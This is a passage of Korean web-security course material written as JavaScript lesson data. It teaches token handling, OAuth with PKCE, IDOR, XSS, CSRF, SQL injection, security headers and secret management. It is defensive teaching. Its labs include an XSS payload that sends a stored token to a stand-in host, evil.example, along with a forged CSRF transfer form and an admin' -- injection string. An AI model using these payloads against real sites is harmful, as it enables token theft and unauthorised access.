    `<div class="pair"><div><h4>🎟 당일 손목밴드 = Access Token</h4>${lines(['놀이기구마다 보여 준다 (모든 API 요청)', '오늘 18시까지만 유효 (짧은 수명)', '잃어버려도 오늘 하루치 피해'])}</div><div><h4>💳 연간 회원권 = Refresh Token</h4>${lines(['매표소에서만 꺼낸다 (refresh endpoint만)', '1년간 유효, 매일 새 손목밴드를 받는 데 사용', '지갑 깊이 보관 (HttpOnly 쿠키)', '분실 신고하면 즉시 정지 (DB에서 폐기)'])}</div></div>`,
    T(['만약 이렇게 하면?', '놀이공원에서는', '웹에서는'], [['회원권을 놀이기구마다 보여 준다', '직원 수십 명이 회원권을 보게 됨', '긴 수명 토큰이 모든 요청 · 로그에 노출'], ['손목밴드 유효기간을 1년으로', '주운 사람이 1년 내내 무료 입장', '탈취된 Access Token이 오래 유효'], ['회원권을 정지할 수 없다', '도난 회원권으로 계속 재발급', 'Refresh Token을 서버에 기록해 폐기 가능하게']]),
    H.key('원칙: <b>자주 보여 주는 것은 짧게</b>, 오래가는 것은 드물게 보여 주고 깊이 보관한다.'),
  ] },

{ id: 'w6.store', title: '토큰은 브라우저 어디에 저장하는가 · Session vs JWT', slides: 'S32–S33',
  blocks: [
    `<p>정답은 하나가 아니다 — <b>XSS와 CSRF 중 무엇을 더 막을지</b>의 트레이드오프.</p>`,
    T(['저장 위치', 'JS로 읽기', 'XSS 시', 'CSRF 시', '평가'], STORE.map(r => r.slice(1))),
    H.cards([['권장 조합 (SPA)', 'Access Token → <b>메모리</b><br>Refresh Token → <b>HttpOnly; Secure; SameSite=Strict 쿠키</b><br>새로고침 시 refresh endpoint로 Access Token 재발급', 'L3'], ['주의', 'HttpOnly 쿠키도 XSS를 “해결”하지 않는다 — 탈취는 막지만 그 페이지에서 요청을 보내는 것은 가능<br>→ XSS 자체를 막는 것(출력 이스케이프 · CSP)이 먼저', '']]),
    H.note('AI가 만든 React 코드의 <code>localStorage.setItem("token", …)</code>은 가장 흔한 패턴이다. 학습용으로는 괜찮지만 배포 전에는 저장 위치를 다시 결정하자.'),
    { h3: 'Design Choice — Session vs JWT (S33)' },
    T(['기준', 'Session (서버 저장)', 'JWT (자기 포함 토큰)'], [['상태', 'Stateful — 저장소 필요', 'Stateless — 키만 있으면 검증'], ['즉시 로그아웃 · 강제 차단', '<span class="cok">쉽다</span> — 저장소에서 삭제', '<span class="cbad">어렵다</span> — 만료까지 유효 (블랙리스트 필요)'], ['Scale-out', 'Redis 등 공유 저장소 필요', '<span class="cok">유리</span> — 서버를 늘려도 그대로'], ['요청 크기', '작다 (sid 수십 바이트)', '크다 (수백 바이트~수 KB, 매 요청)'], ['클라이언트 종류', '브라우저 중심 (쿠키 자동 전송)', '모바일 앱 · IoT · 서버 간 호출에 편리'], ['여러 서비스 간 공유', '저장소를 같이 봐야 함', '공개키(RS256)로 각 서비스가 독립 검증'], ['대표 위험', '세션 탈취 · CSRF', '토큰 탈취 · 검증 누락 · 긴 만료']]),
    { lab: { title: '요구사항이 선택을 정한다', init: { c: 'web' },
      ctl: [{ k: 'c', type: 'select', label: '서비스', opts: [['web', '같은 도메인의 웹사이트, 즉시 차단이 중요'], ['app', '모바일 앱 · 마이크로서비스 · 여러 API'], ['iot', 'IoT 기기 · 서버 간 자동 호출']] }],
      out: st => { const v = { web: ['Session', '쿠키 자동 전송이 자연스럽고, 저장소에서 지우면 즉시 로그아웃.'], app: ['JWT (짧은 만료 + Refresh)', '쿠키가 불편한 클라이언트, 각 서비스가 공개키로 독립 검증.'], iot: ['API Key 또는 mTLS', '사람이 로그인하지 않는다 — 기기(프로그램) 자체를 식별.'] }[st.c];
        return `<div class="verdict ok">→ ${v[0]}</div><p style="margin:0">${v[1]} 실무에서는 섞어 쓴다: 웹은 세션 쿠키, 내부 서비스는 JWT, 외부 파트너는 API Key · OAuth. (강의: 최근 트렌드는 JWT)</p>`; } } },
  ] },

{ id: 'w6.oauth', title: 'OAuth 2.0 — 비밀번호 대신 “발레 키”', slides: 'S34–S35',
  blocks: [
    `<p>“시간표 앱이 내 구글 캘린더에 일정을 넣게 하고 싶다” — 구글 비밀번호를 앱에 줘야 할까?</p>`,
    `<div class="pair"><div><h4 class="cbad">✕ 비밀번호를 앱에 준다면</h4>${lines(['앱이 내 메일 · 드라이브 · 결제까지 전부 할 수 있다 (권한 과다)', '앱이 털리면 내 구글 비밀번호가 유출', '앱만 끊고 싶으면 비밀번호를 바꿔야 한다', 'MFA를 쓰는 계정은 동작조차 안 한다'])}</div><div><h4 class="cok">○ OAuth 2.0으로 위임한다면</h4>${lines(['비밀번호는 구글 로그인 화면에만 입력', '앱은 “캘린더 쓰기”만 가능한 Access Token을 받는다 (<b>scope</b>)', '언제든 구글 설정에서 그 앱만 연결 해제', '앱이 털려도 비밀번호는 안전'])}</div></div>`,
    T(['OAuth 역할', '이 예에서', '하는 일'], [['<b>Resource Owner</b>', '나 (사용자)', '“이 앱에 캘린더 쓰기를 허락합니다” 동의'], ['<b>Client</b>', '시간표 앱', '권한을 요청하고 Access Token으로 API 호출'], ['<b>Authorization Server</b>', 'accounts.google.com', '로그인 · 동의 화면 제공, 토큰 발급'], ['<b>Resource Server</b>', 'Google Calendar API', '토큰을 검증하고 데이터 제공']]),
    T(['발레파킹', 'OAuth 2.0', '포인트'], [['마스터 키 꾸러미 (집 · 사무실 열쇠까지)', '비밀번호를 통째로', '—'], ['“시동만 가능”한 발레 키', 'scope = calendar.events', '필요한 최소 권한만 요청'], ['오늘 저녁까지만', 'Access Token 만료 (예: 1시간)', '시간 제한'], ['키 회수', '구글 계정 → 연결된 앱 → 액세스 삭제', '비밀번호 변경 없이 그 앱만 차단']]),
    H.key('OAuth는 <b>인가(권한 위임)</b> 프로토콜이다. “구글로 로그인”처럼 <b>신원(인증)</b>까지 받으려면 그 위에 <b>OpenID Connect(ID Token)</b>를 얹는다.'),
  ] },

{ id: 'w6.pkce', title: 'Authorization Code Flow + PKCE', slides: 'S36',
  blocks: [
    { trace: { mode: 'ladder', title: '토큰은 브라우저 주소창이 아니라 뒷단 요청으로 받는다', side: 100, rowH: 54,
      lanes: [{ id: 'u', label: '사용자 브라우저' }, { id: 'c', label: 'Client 앱' }, { id: 'as', label: 'Auth Server' }, { id: 'rs', label: 'Resource API' }],
      events: [
        { from: 'c', to: 'u', label: '① 로그인 페이지로 보냄', color: 'l7', pkt: [res('302 Found', [['Location', 'accounts.google.com/authorize?client_id=…&redirect_uri=…&scope=calendar.events&state=x7Q&code_challenge=SHA256(verifier)']])], say: '앱이 <b>verifier</b>(비밀 난수)를 만들고 그 <b>해시(challenge)</b>만 함께 보낸다. <b>state</b>는 CSRF 방지용 난수.' },
        { from: 'u', to: 'as', label: '② 로그인 + “캘린더 허용” 동의', color: 'l7', say: '비밀번호는 <b>구글 화면에만</b> 입력된다. 앱은 비밀번호를 본 적이 없다.' },
        { from: 'as', to: 'u', label: '③ redirect_uri?code=AbC123', color: 'ok', pkt: [res('302 Found', [['Location', 'https://app.example/callback?code=AbC123&state=x7Q']])], say: '<b>code</b> = 짧은 수명 1회용 교환권. 주소창에 보이지만 이것만으로는 토큰을 못 받는다.' },
        { from: 'u', to: 'c', label: '④ code 전달', color: 'l7', say: '앱이 state가 자기가 보낸 값과 같은지 확인.' },
        { from: 'c', to: 'as', label: '⑤ POST /token (code + verifier)', color: 'l4', pkt: [req('POST /token', [['Body', 'grant_type=authorization_code&code=AbC123&code_verifier=…']])], say: '이제야 원래 비밀값(verifier)을 보여 준다. Auth Server가 해시해서 ①의 challenge와 비교 → 같으면 발급.' },
        { from: 'as', to: 'c', label: '⑥ access_token 발급', color: 'ok', pkt: [res('200 OK', [['Body', '{"access_token":"ya29…","expires_in":3600,"scope":"calendar.events"}']])], say: '토큰은 <b>뒷단 요청</b>으로 받았다 — 브라우저 주소창 · 기록에 남지 않는다.' },
        { from: 'c', to: 'rs', label: '⑦ GET /calendar/events  Bearer', color: 'l7', pkt: [req('GET /calendar/v3/events', [['Authorization', 'Bearer ya29…']])], say: 'scope가 허락한 일만 할 수 있다.' },
      ] } },
    T(['용어', '의미'], [['client_id', '앱의 공개 식별자'], ['redirect_uri', '코드를 돌려받을 등록된 주소'], ['scope', '요청 권한 범위'], ['code', '짧은 수명 1회용 교환권'], ['state', 'CSRF 방지용 난수'], ['challenge', 'verifier의 해시 (①에 포함)'], ['PKCE', '코드 가로채기 방지']], { mono: [0] }),
    H.key('PKCE 한 줄 요약 — ①에서 비밀값의 <b>해시</b>를 먼저 보내고, ⑤에서 <b>원래 비밀값</b>을 보여 준다. 코드를 훔친 공격자는 비밀값이 없어 토큰을 못 받는다.'),
    H.note('토큰을 URL로 바로 주던 Implicit Flow는 더 이상 권장되지 않는다 (OAuth 2.0 Security BCP). 지금은 SPA · 모바일도 Code + PKCE.'),
  ] },

{ id: 'w6.apikey', title: 'API Key — 사용자가 아니라 “프로그램”을 식별한다', slides: 'S37',
  blocks: [
    T(['', 'API Key', 'Access Token (사용자)', 'OAuth Token (위임)'], [['나타내는 것', '어떤 <b>앱 · 프로젝트</b>', '어떤 <b>사용자</b>', '어떤 사용자가 어떤 앱에 허락한 권한'], ['수명', '길다 (수동 교체 전까지)', '짧다 (분 단위)', '짧다 + Refresh'], ['발급', '개발자 콘솔에서 복사', '로그인 시 자동', '사용자 동의 후'], ['예', '날씨 · 지도 · LLM API', '학사 시스템 로그인', '구글 캘린더 연동'], ['전송', 'X-API-Key 또는 Authorization', 'Authorization: Bearer', 'Authorization: Bearer']]),
    `<div class="pair"><div><h4 class="cbad">✕ 프론트엔드 코드에 넣으면 누구나 본다</h4>${H.pre('const KEY = "sk-live-8f2a…";   // DevTools → Sources')}</div><div><h4 class="cok">○ 서버에서만 사용 (환경변수)</h4>${H.pre('key = os.environ["WEATHER_API_KEY"]')}</div></div>`,
    `<p><b>API Key 관리 원칙</b></p>` + lines(['브라우저 · 앱 코드에 넣지 않는다 → 서버가 대신 호출 (Proxy)', '키마다 허용 IP · 도메인 · 권한 · 사용량 한도를 건다', 'Git에 올라갔다면 지우는 것으로 부족 → 즉시 폐기 · 재발급']),
    H.warn('API Key만으로는 <b>“어떤 사용자인지” 알 수 없다</b>. 사용자별 데이터가 있는 API라면 사용자 인증(세션 · 토큰)이 따로 필요하다.'),
  ] },

{ id: 'w6.authz', title: '인가 모델 · IDOR — 주소창 숫자 하나만 바꿨을 뿐인데', slides: 'S38–S39',
  blocks: [
    H.cards([['RBAC — Role-Based', '역할에 권한을 묶는다<br>student: 조회 · professor: 조회 + 입력 · admin: 전체', ''], ['소유권 검사 — Ownership', '자원의 주인인지 확인<br>학생은 자기 성적만 <code>grade.student_id == user.sub</code>', 'L3'], ['ABAC — Attribute-Based', '속성 조합으로 판단<br>“성적 입력은 학기 중, 교내망에서만”', 'L4'], ['Scope — OAuth 권한 범위', '토큰에 허용된 행동 목록<br><code>grades:read</code> · <code>grades:write</code>', 'L7']]),
    { lab: { title: 'IDOR 재현 — 2026001을 2026002로 바꿔서 다시 요청', init: { id: '2026002', chk: false },
      ctl: [{ k: 'id', type: 'select', label: '/api/students/{id}/grades', opts: [['2026001', '2026001 (내 것)'], ['2026002', '2026002 (이송도)']] }, { k: 'chk', type: 'toggle', label: '서버에 소유권 검사 있음' }],
      out: st => { const mine = st.id === '2026001', leak = !mine && !st.chk;
        const code = `@app.get("/v1/students/{sid}/grades")
def grades(sid: str, user = Depends(current_user)):   # 인증 ✓
    if user["role"] == "professor":                     # RBAC
        return db.grades(sid)
${st.chk ? '    if user["sub"] != sid:                              # 소유권 검사\n        raise HTTPException(403, "forbidden")\n' : '    # (소유권 검사 없음!)\n'}    return db.grades(sid)`;
        return `<p class="mono" style="margin:0 0 6px">🌐 https://portal.inu.ac.kr/api/students/${st.id}/grades &nbsp;·&nbsp; 토큰 sub=2026001 (김인천)</p>${H.pre(code)}` +
          `<div class="verdict ${leak ? 'bad' : 'ok'}">${mine ? '200 — 내 성적' : st.chk ? '403 Forbidden' : '200 — 남의 성적이 나온다!'}</div>${H.pre(mine ? '{"student": "김인천", "NET301": "A+", "AI201": "B0"}' : st.chk ? '{"detail": "forbidden"}' : '{"student": "이송도", "NET301": "B+", …}   ← IDOR')}` +
          `<p style="margin:0">${leak ? '내 열쇠로 내 사물함 312번을 열었는데 313번에도 맞는다 — 자물쇠가 “열쇠 주인”을 확인하지 않았다 (인증 ✓, 인가 ✕).' : '서버가 path의 id와 토큰의 sub를 비교한다. 실패 시 403, 존재 자체를 숨기려면 404.'}</p>`; } } },
    `<p><b>방어</b></p>` + lines(['서버에서 path의 id == 토큰의 sub 또는 권한 검사', '실패 시 403, 존재 자체를 숨기려면 404', 'id를 추측하기 어렵게(UUID) — <b>보조 수단일 뿐</b>, 검사를 대신하지 못함']),
    H.key('최소 권한 원칙 — 필요한 만큼만, 필요한 시간만. 기본값은 “거부”, 허용을 명시. <b>프론트에서 버튼을 숨기는 것은 보안이 아니다</b> → 서버에서 매번 검사.'),
    H.warn('인증은 프레임워크가 대부분 해 주지만, 인가는 비즈니스 규칙이라 개발자가 직접 써야 한다 → 그래서 가장 자주 빠진다. OWASP Top 10에서 <b>Broken Access Control</b>이 가장 위험한 항목.'),
  ] },

{ id: 'w6.xss', title: 'XSS · CSRF — 브라우저를 노리는 두 공격', slides: 'S40–S41',
  blocks: [
    { h3: 'XSS — 남의 페이지에 내 스크립트 심기 (Cross-Site Scripting)' },
    { lab: { title: '댓글 하나가 “코드”로 실행되는 순간', init: { c: `<img src=x onerror="fetch('https://evil.example/steal?c='+localStorage.getItem('token'))">`, esc: false },
      ctl: [{ k: 'c', type: 'text', label: '댓글 입력', w: 420 }, { k: 'esc', type: 'toggle', label: '출력 이스케이프 (React · Jinja2 기본)' }],
      out: st => { const danger = /<\s*(script|img|svg|iframe)|on\w+\s*=|javascript:/i.test(st.c);
        const html = st.esc ? esc(st.c) : st.c;
        return `<p class="cm" style="margin:0 0 4px;font-size:13px">서버가 만든 HTML</p>${H.pre(`<div class="comment">${html}</div>`)}` +
          `<div class="verdict ${!danger || st.esc ? 'ok' : 'bad'}">${!danger ? '평범한 글' : st.esc ? '글자로만 표시됨 — 실행 안 됨' : '실행됨 — 댓글을 연 모든 사용자의 토큰이 evil로 전송'}</div>` +
          `<p style="margin:0">${st.esc ? '&lt; &gt; " 가 &amp;lt; 등으로 바뀌어 브라우저가 “태그”가 아니라 “글자”로 그린다 — 쪽지를 유리 액자에 넣어 읽기만 가능하게.' : '게시판(브라우저)이 쪽지를 “글”이 아니라 “명령”으로 실행했다.'}</p>`; } } },
    T(['방어', '어떻게', '비유'], [['<b>출력 이스케이프</b>', '&lt; &gt; " \' 를 &amp;lt; 등으로 바꿔 “글자”로만 표시', '쪽지를 유리 액자에'], ['위험 API 피하기', 'innerHTML · dangerouslySetInnerHTML · v-html 최소화', '액자에서 쪽지를 꺼내지 않기'], ['<b>CSP 헤더</b>', "Content-Security-Policy: script-src 'self' — 허용된 출처의 스크립트만", '등록된 직원의 지시만 따르기'], ['HttpOnly 쿠키', '스크립트가 세션 쿠키를 읽지 못하게 (<b>피해 축소</b>)', '지갑을 금고에']]),
    H.key('XSS가 성공하면 그 페이지에서 “사용자인 척” 무엇이든 할 수 있다. 토큰 저장 위치보다 <b>XSS 자체를 막는 것</b>이 근본 대책이다.'),
    { h3: 'CSRF — 내 브라우저가 나도 모르게 보낸 요청 (Cross-Site Request Forgery)' },
    { trace: { mode: 'ladder', title: '쿠키 “자동 첨부”를 악용한 위조 요청', side: 100, rowH: 52,
      lanes: [{ id: 'b', label: '내 브라우저' }, { id: 'e', label: 'evil.example' }, { id: 'k', label: 'bank.example' }],
      events: [
        { from: 'b', to: 'k', label: '① 은행 로그인 → 쿠키 sid 저장', color: 'ok', say: '정상 로그인. 브라우저에 bank.example의 세션 쿠키가 있다.' },
        { from: 'b', to: 'e', label: '② 이벤트 페이지 방문', color: 'l7', say: '다른 탭에서 “경품 이벤트” 페이지를 연다.' },
        { from: 'e', to: 'b', label: '③ 숨겨진 자동 제출 form', color: 'bad', pkt: [res('200 OK', [['Body', '<form action="https://bank.example/transfer" method="POST"> <input name="to" value="evil"> … <script>form.submit()</script>']])], say: '사기꾼이 내 이름으로 “송금 요청서”를 미리 써 두었다.' },
        { from: 'b', to: 'k', label: '④ POST /transfer  Cookie: sid (자동!)', color: 'bad', pkt: [req('POST /transfer', [['Origin', 'https://evil.example'], ['Cookie', 'sid=… (SameSite=None이면 자동 첨부)']])], say: '은행은 내 얼굴(쿠키)을 보고 처리해 버린다 — 요청서를 <b>누가 썼는지</b>는 확인하지 않았다. SameSite=Lax/Strict면 다른 사이트에서 시작된 POST에 쿠키가 안 붙어 실패한다.' },
      ] } },
    T(['방어', '원리', '비고'], [['<b>SameSite=Lax/Strict</b>', '다른 사이트에서 시작된 POST에는 쿠키를 붙이지 않는다', '가장 효과적 · 현대 브라우저 기본 Lax'], ['<b>CSRF 토큰</b>', '폼마다 서버가 준 난수를 함께 보내야 처리 — 공격자는 이 값을 모른다', '세션 쿠키 방식 웹 앱에 필수'], ['Bearer 헤더 인증', 'Authorization 헤더는 자동 첨부되지 않는다 → CSRF에 강함', '대신 XSS에 주의']]),
    H.note('XSS = “내 사이트에서 공격자 코드가 돈다” · CSRF = “다른 사이트가 내 쿠키로 요청을 보낸다”. 원인이 다르니 방어도 다르다.'),
  ] },

{ id: 'w6.sqli', title: 'SQL Injection · 무차별 대입과 Rate Limiting', slides: 'S42–S43',
  blocks: [
    { lab: { title: '아이디 칸에 admin\' -- 를 넣으면', init: { uid: "admin' --", bind: false },
      ctl: [{ k: 'uid', type: 'text', label: '아이디 입력', w: 200 }, { k: 'bind', type: 'toggle', label: '파라미터 바인딩 (Prepared Statement)' }],
      out: st => { const q = st.bind ? `cur.execute("SELECT id, pw_hash FROM users WHERE id = ?", (${JSON.stringify(st.uid)},))` : `SELECT * FROM users WHERE id='${st.uid}' AND pw='…'`;
        const inj = !st.bind && /'/.test(st.uid);
        return H.pre((st.bind ? '# ○ 입력은 “값”으로만 — SQL 문법이 될 수 없다\n' : '# ✕ 문자열을 이어 붙여 SQL 만들기\n') + q) +
          `<div class="verdict ${inj ? 'bad' : 'ok'}">${inj ? (/--/.test(st.uid) ? '뒤는 주석 처리 → 비밀번호 검사 사라짐 → 관리자로 로그인' : '따옴표가 SQL 문법을 깨뜨렸다 — 쿼리 구조가 바뀜') : '입력은 메뉴 이름(값)으로만 읽힌다'}</div>`; } } },
    H.key('주문서 빈칸 비유 — “( ) 커피 1잔” 빈칸에 “아메리카노) 그리고 금고 열어 주세요 (”를 쓰면 점원이 빈칸을 “지시”로 읽어 버린다. 바인딩 = 빈칸 내용은 무조건 메뉴 이름으로만.<br>같은 뿌리: <b>Command Injection</b> <code>os.system(f"ping {host}")</code> · <b>Prompt Injection</b> (LLM 입력 속 숨은 지시문). 공통 원칙: <b>데이터와 명령을 섞지 않는다</b>.'),
    H.warn('인젝션 방어의 핵심은 “입력 필터링”이 아니라 <b>“구조적 분리”</b>다. 블랙리스트로 따옴표를 지우는 방식은 언제나 우회된다. ORM(SQLAlchemy)도 내부적으로 바인딩을 쓴다.'),
    { h3: '무차별 대입과 Rate Limiting (S43)' },
    T(['공격', '방식'], [['Brute Force', '한 계정에 0000~9999 모든 조합 시도'], ['Dictionary', '흔한 비밀번호 목록(123456, qwerty…) 대입'], ['Credential Stuffing', '다른 사이트에서 유출된 ID/PW 쌍을 그대로 시도'], ['Password Spraying', '많은 계정에 흔한 비밀번호 1~2개씩 (잠금 회피)']]),
    `<div class="pair"><div><h4>방어 조합</h4>${lines(['IP · 계정별 시도 횟수 제한 → <b>429 Too Many Requests</b>', '연속 실패 시 지연 · CAPTCHA · 일시 잠금', 'MFA — 비밀번호가 맞아도 한 단계 더', '유출 비밀번호 목록과 대조해 가입 거부'])}</div><div><h4>Rate limit 응답</h4>${H.pre('HTTP/1.1 429 Too Many Requests\nRetry-After: 60\nContent-Type: application/json\n\n{"detail": "too many login attempts, retry after 60s"}')}</div></div>`,
    H.warn('계정 잠금의 함정 — 5회 실패 시 <b>영구</b> 잠금이면 공격자가 남의 계정을 일부러 잠가 버릴 수 있다(서비스 거부). 시간 기반 잠금 + 알림이 낫다.'),
    H.note('Rate limit은 보통 앱 코드보다 앞단(Nginx · API Gateway · Cloud WAF)에서 건다 → 9주차 Cloud 구조에서 다시.'),
  ] },

{ id: 'w6.headers', title: '보안 응답 헤더 · Secret 관리', slides: 'S44–S45',
  blocks: [
    T(['헤더', '예시 값', '효과'], [['Strict-Transport-Security', 'max-age=31536000; includeSubDomains', 'HTTPS만 사용 강제 (HSTS)'], ['Content-Security-Policy', "default-src 'self'; script-src 'self'", '허용된 출처의 스크립트만 실행 → XSS 피해 축소'], ['X-Content-Type-Options', 'nosniff', 'Content-Type을 추측하지 않음 (파일을 스크립트로 실행 방지)'], ['X-Frame-Options / frame-ancestors', "DENY / frame-ancestors 'none'", '다른 사이트가 iframe으로 감싸지 못함 (Clickjacking)'], ['Referrer-Policy', 'strict-origin-when-cross-origin', '다른 사이트로 이동할 때 URL 경로 · 쿼리 유출 방지'], ['Cache-Control', 'no-store (개인정보 응답)', '공용 PC · 프록시에 성적 페이지가 남지 않게']], { mono: [0, 1] }),
    H.pre(`$ curl -sI https://www.example.com | grep -iE "strict-transport|content-security|x-frame|nosniff"`),
    H.note('보통 Nginx · Reverse Proxy에서 일괄로 붙이거나 FastAPI middleware에서 모든 응답에 추가한다. CSP는 처음부터 엄격하게 걸면 페이지가 깨진다 → Content-Security-Policy-Report-Only로 먼저 관찰.'),
    { h3: 'Secret 관리 — 코드에 비밀을 넣지 않는다 (S45)' },
    `<div class="pair"><div><h4 class="cbad">위험 — AI가 자주 생성하는 코드</h4>${H.pre('SECRET_KEY = "mysecretkey"\nDATABASE_URL = "postgresql://admin:1234@db/app"\n# → GitHub에 push되는 순간 전 세계 공개\n# → 봇이 수 분 안에 수집해 악용')}</div><div><h4 class="cok">권장</h4>${H.pre('import os\nSECRET_KEY = os.environ["JWT_SECRET"]   # 없으면 시작 실패\n# .env (로컬 전용) + .gitignore 에 .env 추가\n$ python -c "import secrets; print(secrets.token_hex(32))"')}</div></div>`,
    T(['원칙', '내용'], [['길고 무작위로', 'JWT HS256 비밀키는 최소 256비트(32바이트) 무작위 — "secret", "changeme" 금지'], ['환경별로 다르게', '개발 · 스테이징 · 운영이 같은 키를 쓰지 않는다'], ['유출 시 즉시 교체', 'Git 기록에서 지워도 이미 복제됐다고 가정 → 폐기 · 재발급(Rotation)이 먼저'], ['전용 저장소', '운영은 Secret Manager(AWS · GCP · Vault) · Kubernetes Secret']]),
    H.key('JWT 서명 키 · DB 비밀번호 · API Key는 “코드”가 아니라 <b>“설정”</b>이다. AI에게 코드를 붙여 넣을 때도 실제 키가 든 .env나 로그를 그대로 붙여 넣지 않는다.'),
  ] },

{ id: 'w6.arch', title: 'Architecture View · Common Failure Modes', slides: 'S46–S48',
  blocks: [
    T(['구간', 'W6 개념', '장애 · 공격'], [['Browser · Frontend JS<br><small>쿠키 · 토큰 보관</small>', 'HttpOnly · SameSite · 저장 위치', 'XSS · CSRF · 토큰 탈취'], ['TLS / Proxy<br><small>HTTPS 종료 · 보안 헤더 · Rate limit</small>', 'TLS · 인증서 · HSTS · 429', '인증서 만료 · MITM · 무차별 대입'], ['Auth Endpoint<br><small>/login · /token</small>', 'Hash · Salt · MFA · Access/Refresh', '계정 노출 · 만료 · 서명 오류'], ['Middleware<br><small>세션 조회 · JWT 서명 검증</small>', 'exp · alg · iss', 'alg 혼동'], ['Handler<br><small>인가 검사</small>', '401 vs 403 · RBAC · 소유권 (IDOR 방지)', '권한 누락 · 과다 노출'], ['Database', 'Argon2 해시 · 바인딩 쿼리 · Secret 분리', '평문 저장 · 인젝션']]),
    H.key('방어는 한 겹이 아니라 여러 겹(<b>Defense in Depth</b>)이다. 한 계층이 뚫려도 다음 계층이 피해를 줄이도록 설계한다.'),
    T(['증상', '흔한 원인', '확인 방법'], [['401 — 로그인했는데도', 'Authorization 헤더 누락 · "Bearer " 접두어 빠짐 · 토큰 만료', 'DevTools Network → Request Headers'], ['401 invalid signature', '발급 · 검증 서버의 SECRET이 다름 (환경변수 미설정, 재시작 시 랜덤 생성)', '두 서버의 키 설정 비교'], ['401 token expired (바로)', '서버 간 시계 차이 · exp를 밀리초로 · 타임존 혼동', 'date 명령 · exp 디코딩'], ['403 — 관리자인데도', 'role 클레임 이름 불일치 (roles vs role) · 토큰 재발급 전 권한 변경', '토큰 Payload 디코딩'], ['로그인 후 쿠키가 안 붙음', 'Secure 쿠키를 http에서 · SameSite=None인데 Secure 없음 · credentials 미설정', 'Application → Cookies 경고 아이콘'], ['CORS 오류 + 쿠키', 'allow_origins=["*"] + credentials · fetch에 credentials: "include" 누락', '5주차 CORS (5.24)'], ['인증서 경고 · SSL 오류', '만료 · 체인 누락 · 도메인 불일치 · 자체 서명', 'openssl s_client -showcerts'], ['새로고침하면 로그아웃', 'Access Token을 메모리에만 두고 Refresh 흐름 없음', '앱 시작 시 refresh 호출 여부']]),
    { lab: { title: '판단표 — 브라우저 → curl → 토큰 내용 → 서버 로그 순으로', init: { tls: true, curl: true, br: false, code: '401' },
      ctl: [{ k: 'tls', type: 'toggle', label: 'TLS 연결 성공' }, { k: 'curl', type: 'toggle', label: 'curl (Bearer $T) 성공' }, { k: 'br', type: 'toggle', label: '브라우저 성공' }, { k: 'code', type: 'select', label: '브라우저가 받은 코드', opts: [['401', '401'], ['403', '403']] }],
      out: st => { let v;
        if (!st.tls) v = ['TLS 오류 — HTTP 이전 단계', '인증서 문제 (만료 · 체인 · 도메인). openssl s_client로 확인.'];
        else if (!st.curl) v = ['토큰 · 키 · 만료 문제', 'curl도 401 → 토큰 자체가 문제. Payload를 디코딩해 exp · iss를 보고, 서버 JWT_SECRET을 확인.'];
        else if (!st.br && st.code === '401') v = ['헤더 누락 · 쿠키 미전송 · CORS credentials', 'curl ✓ 브라우저 ✕ → 요청에 Authorization이 실제로 붙었는지, 쿠키 속성(Secure · SameSite), fetch credentials를 본다.'];
        else if (!st.br) v = ['인가 로직', '403 → 인증은 됐다. role 클레임 이름 · 소유권 검사 로직을 확인.'];
        else v = ['정상', '양쪽 모두 성공.'];
        return `<div class="verdict ${st.br && st.curl && st.tls ? 'ok' : 'bad'}">${v[0]}</div><p style="margin:0">${v[1]}</p>`; } } },
    H.pre(`# 토큰 Payload만 빠르게 보기 (로컬에서)
$ python - <<'EOF'
import jwt, os
t = os.environ["T"]
print(jwt.get_unverified_header(t))
print(jwt.decode(t, options={"verify_signature": False}))
EOF
# 실제 운영 토큰을 외부 웹사이트에 붙여 넣지 않는다`),
    H.note('401은 “누구인지 모름”, 403은 “누군지 알지만 안 됨” — 이 구분만 정확해도 원인 범위가 절반으로 줄어든다.'),
  ] },

{ id: 'w6.lab', title: 'Hands-on Lab · AI 보안 코드 리뷰 · 과제', slides: 'S49–S51, S53',
  blocks: [
    { h3: 'Lab ① — JWT로 보호된 FastAPI' },
    H.pre(`# auth_api.py   $ pip install "fastapi[standard]" pyjwt "pwdlib[argon2]"
SECRET = os.environ["JWT_SECRET"]                 # 하드코딩 금지
ph = PasswordHash.recommended()
users = {"kim": {"hash": ph.hash("pw1234"), "role": "student"}}
oauth2 = OAuth2PasswordBearer(tokenUrl="login")

@app.post("/login")
def login(form: OAuth2PasswordRequestForm = Depends()):
    u = users.get(form.username)
    if not u or not ph.verify(form.password, u["hash"]):
        raise HTTPException(401, "invalid credentials")
    exp = dt.datetime.now(dt.timezone.utc) + dt.timedelta(minutes=15)
    claims = {"sub": form.username, "role": u["role"], "exp": exp}
    return {"access_token": jwt.encode(claims, SECRET, algorithm="HS256"), "token_type": "bearer"}

def current_user(token: str = Depends(oauth2)):
    try:
        return jwt.decode(token, SECRET, algorithms=["HS256"])
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "invalid token")

@app.get("/admin/grades")
def all_grades(user=Depends(current_user)):
    if user["role"] != "professor": raise HTTPException(403, "forbidden")
    return [{"sid": "2026001", "NET301": "A+"}]`),
    H.note('OAuth2PasswordBearer 덕분에 /docs에 자물쇠 아이콘과 로그인 창이 자동으로 생긴다.'),
    { h3: 'Lab ② — 일부러 깨뜨려 보고 관찰하기' },
    T(['#', '실험', '기대 결과'], [['A', 'Authorization 헤더 없이 /me', '401 Not authenticated'], ['B', '토큰 끝 글자 1개 변경', '401 invalid token'], ['C', 'Payload의 role을 professor로 바꿔 재조립', '401 (서명 불일치)'], ['D', '서버를 다른 JWT_SECRET으로 재시작', '기존 토큰 모두 401'], ['E', 'student 토큰으로 /admin/grades', '403 forbidden'], ['F', '비밀번호 틀림 5번 연속', '매번 401 — <b>제한 없음!</b>']]),
    H.key('실험 D가 핵심 질문: 서버가 재시작될 때마다 비밀키를 랜덤으로 만들면? 서버가 2대라면? → 서로 다른 키로 서명 · 검증하게 되어 401이 무작위로 난다. 키는 환경변수로 <b>고정 · 공유</b>.'),
    { h3: 'AI가 만든 인증 코드를 “공격자의 눈”으로 (S51)' },
    { mount: el => { const C = ['SECRET이 코드에 하드코딩되어 있지 않은가?', '비밀번호를 Argon2/bcrypt로 해시하는가? (SHA-256 · 평문 ✕)', 'jwt.decode에 algorithms를 고정했는가? 서명 검증을 끄지 않았는가?', 'Access Token 만료가 짧은가? (days=30 ✕)', '학생 성적 API에 소유권 검사가 있는가? (IDOR)', '로그인 실패 메시지가 계정 존재를 노출하지 않는가?', '로그인에 Rate limit이 있는가?', 'CORS가 "*" + credentials 조합이 아닌가?', '토큰 · 비밀번호를 로그에 출력하지 않는가?'];
